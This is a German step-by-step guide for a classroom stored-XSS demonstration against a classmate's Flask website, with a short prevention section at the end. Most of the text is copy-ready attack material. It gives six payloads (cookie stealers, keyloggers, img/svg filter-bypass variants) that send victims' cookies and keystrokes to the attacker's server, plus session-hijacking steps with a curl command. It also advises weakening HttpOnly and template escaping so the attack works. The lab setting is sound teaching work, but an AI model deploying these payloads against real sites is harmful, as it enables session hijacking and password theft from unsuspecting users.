# 🎯 XSS Payloads - Für Angriff auf Marc's Website

## ⚠️ NUR FÜR BILDUNGSZWECKE

---

## 🔧 Setup

### Deine Rolle: Angreifer
- **Deine IP:** `141.87.56.31`
- **Dein Server Port:** `8888`
- **Ziel:** Marc's Website auf `http://141.87.56.125:5001`

---

## 🚀 Schritt-für-Schritt Anleitung

### **1. Starte deinen Cookie-Stealer Server**

```bash
cd xss_cookie_stealer
python server.py
```

**Erwartete Ausgabe:**
```
================================================================================
🍪 XSS COOKIE STEALER SERVER
================================================================================
Server gestartet auf: http://127.0.0.1:8888/steal
```

**Wichtig:** Server muss auf Port **8888** laufen!

---

### **2. Gehe auf Marc's Website**

Öffne Browser: `http://141.87.56.125:5001`

---

### **3. Registriere dich als neuer User**

Klicke auf **"Register"** oder gehe zu: `http://141.87.56.125:5001/register`

**Fülle aus:**
- **Username:** `attacker` (oder beliebig)
- **Password:** `test123`
- **Bio-Feld:** ← **HIER KOMMT DER PAYLOAD REIN!**

---

## 📝 PAYLOADS ZUM KOPIEREN

### **PAYLOAD 1: Cookie-Stealer (empfohlen für erste Demo)**

Kopiere das ins **Bio-Feld**:

```html
<script>fetch('http://141.87.56.31:8888/steal?c='+encodeURIComponent(document.cookie))</script>
```

**Was passiert:**
- Jeder der `/users` besucht → sein Cookie wird an deinen Server gesendet
- Du siehst in deinem Terminal: **🍪 COOKIE GESTOHLEN!**

---

### **PAYLOAD 2: Keylogger (Zeit-basiert - sendet alle 5 Zeichen)**

Kopiere das ins **Bio-Feld**:

```html
<script>let k='';document.onkeypress=e=>{k+=e.key;if(k.length>5){fetch('http://141.87.56.31:8888/log_keys',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'keys='+k});k=''}}</script>
```

**Was passiert:**
- Jeder der `/users` besucht → Keylogger wird aktiviert
- Wenn das Opfer tippt → Du siehst die Tastenanschläge in deinem Terminal

---

### **PAYLOAD 3: Keylogger Aggressiv (sendet jeden Tastendruck sofort)**

```html
<script>document.onkeypress=e=>fetch('http://141.87.56.31:8888/log_keys',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'keys='+e.key})</script>
```

**Vorteil:** Leichter zu testen, siehst sofort jeden einzelnen Buchstaben

---

### **PAYLOAD 4: Kombiniert (Cookie + Keylogger)**

```html
<script>fetch('http://141.87.56.31:8888/steal?c='+encodeURIComponent(document.cookie));let k='';document.onkeypress=e=>{k+=e.key;if(k.length>5){fetch('http://141.87.56.31:8888/log_keys',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'keys='+k});k=''}}</script>
```

**Zeigt beide Angriffe gleichzeitig!**

---

### **PAYLOAD 5: Cookie-Stealer mit Image-Tag**

Falls `<script>` Tags gefiltert werden:

```html
<img src=x onerror="fetch('http://141.87.56.31:8888/steal?c='+encodeURIComponent(document.cookie))">
```

---

### **PAYLOAD 6: Cookie-Stealer mit SVG**

Alternative falls Image-Tag auch gefiltert wird:

```html
<svg onload="fetch('http://141.87.56.31:8888/steal?c='+encodeURIComponent(document.cookie))">
```

---

## 🎬 DEMO-ABLAUF

### **Phase 1: Account erstellen mit Payload**

1. Gehe zu: `http://141.87.56.125:5001/register`
2. Registriere User mit Cookie-Stealer Payload im Bio-Feld
3. Klicke "Account erstellen"

### **Phase 2: Warte auf's Opfer**

Sage zu Marc:
> "Ich habe mich registriert. Schau mal auf der `/users` Seite wer sich alles angemeldet hat!"

### **Phase 3: Marc besucht `/users`**

Marc geht zu: `http://141.87.56.125:5001/users`

**BOOM! In deinem Terminal:**

```
================================================================================
[+] COOKIE GESTOHLEN!
================================================================================
Zeitstempel: 2025-12-02T12:30:45.123456
IP-Adresse:  141.87.56.125
Cookie:      session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

[*] Flask Session dekodiert:
    User ID:   1
    Username:  marc
================================================================================
```

### **Phase 4: Session Hijacking demonstrieren**

Mit dem gestohlenen Cookie kannst du:

**Option 1: Browser DevTools**
1. Öffne Marc's Website
2. F12 → Application → Cookies
3. Ersetze deinen Cookie mit dem gestohlenen
4. Refresh → Du bist als Marc eingeloggt!

**Option 2: cURL**
```bash
curl -H "Cookie: session=<GESTOHLENER_COOKIE>" http://141.87.56.125:5001/users
```

---

## 🎯 FÜR DIE PRÄSENTATION

### **Demo 1: Cookie-Diebstahl**

**Erzählung:**
> "Ich demonstriere jetzt einen Stored XSS Angriff. Ich habe mich auf der Website registriert und im Bio-Feld JavaScript-Code eingefügt. Dieser Code wird in der Datenbank gespeichert..."

*Zeige das Bio-Feld mit Payload*

> "Sobald jemand die Autoren-Liste besucht, wird sein Session-Cookie an meinen Server gesendet."

*Marc besucht /users*

> "Schauen Sie auf meinen Server - der Cookie wurde gestohlen!"

*Zeige Terminal mit gestohlenen Daten*

---

### **Demo 2: Keylogger**

**Erzählung:**
> "Der gleiche Angriff funktioniert auch mit einem Keylogger. Jetzt erfasse ich alle Tastatureingaben..."

*Marc besucht /users und tippt etwas*

> "Alle Tastenanschläge werden an meinen Server gesendet, auch Passwörter die der User eingibt."

*Zeige Terminal mit Keylogger-Daten*

---

## 🔧 TROUBLESHOOTING

### Problem: Keine Daten kommen an

**Check 1: Server läuft?**
```bash
lsof -i :8888
```

**Check 2: Marc's Website erreichbar?**
```bash
curl http://141.87.56.125:5001
```

**Check 3: Payload richtig?**
- Prüfe ob `141.87.56.31:8888` stimmt (DEINE IP, DEIN PORT)
- Nicht `141.87.56.125` - das ist Marc's IP!

---

### Problem: Cookie ist leer

**Ursache:** HttpOnly ist aktiviert

**Test im Browser:**
Gehe zu Marc's Website → F12 → Console:
```javascript
document.cookie
```

Falls leer → HttpOnly ist aktiv → Marc muss es deaktivieren

---

### Problem: Payload wird als Text angezeigt

**Ursache:** Template escaped HTML

**Lösung:** Marc muss in seinem Template prüfen:
```html
<!-- VERWUNDBAR (was wir brauchen): -->
{{ bio|safe }}

<!-- SICHER (verhindert XSS): -->
{{ bio }}
```

---

## 📊 WAS DU IN DEINEM TERMINAL SIEHST

### Cookie-Stealer Output:

```
================================================================================
[+] COOKIE GESTOHLEN!
================================================================================
Zeitstempel: 2025-12-02T12:30:45.123456
IP-Adresse:  141.87.56.125
Cookie:      session=eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6Im1hcmMifX0...

[*] Flask Session dekodiert:
    User ID:   1
    Username:  marc
================================================================================
```

### Keylogger Output:

```
⌨️  KEYLOG [12:30:50] [141.87.56.125]: hello
⌨️  KEYLOG [12:30:53] [141.87.56.125]: password123
⌨️  KEYLOG [12:30:56] [141.87.56.125]: secret
```

---

## ✅ CHECKLISTE VOR DEMO

- [ ] Dein Cookie-Stealer Server läuft auf Port 8888
- [ ] Marc's Website ist erreichbar: `http://141.87.56.125:5001`
- [ ] Du hast dich registriert mit Payload im Bio
- [ ] Terminal ist bereit und sichtbar für Professor
- [ ] Marc weiß dass er `/users` besuchen muss
- [ ] Beide im gleichen Netzwerk (141.87.56.x)

---

## 🎓 ERKLÄRUNG FÜR PROF

### Warum ist das gefährlich?

1. **Stored XSS:** Code bleibt permanent in der Datenbank
2. **Automatisch:** Jeder Besucher ist betroffen, keine Interaktion nötig
3. **Session Hijacking:** Mit dem Cookie kann ich mich als Opfer ausgeben
4. **Privilege Escalation:** Wenn Admin betroffen → voller Zugriff
5. **Unsichtbar:** Opfer merkt nichts

### Wie verhindert man das?

1. **Input Sanitization:** `html.escape()` vor dem Speichern
2. **Output Encoding:** Jinja2 Auto-Escaping (kein `|safe`)
3. **Content Security Policy:** HTTP Header gegen JavaScript-Ausführung
4. **HttpOnly Cookies:** Verhindert `document.cookie` Zugriff
5. **Input Validation:** Whitelist erlaubter Zeichen

---

**VIEL ERFOLG BEI DER DEMO! 🚀**
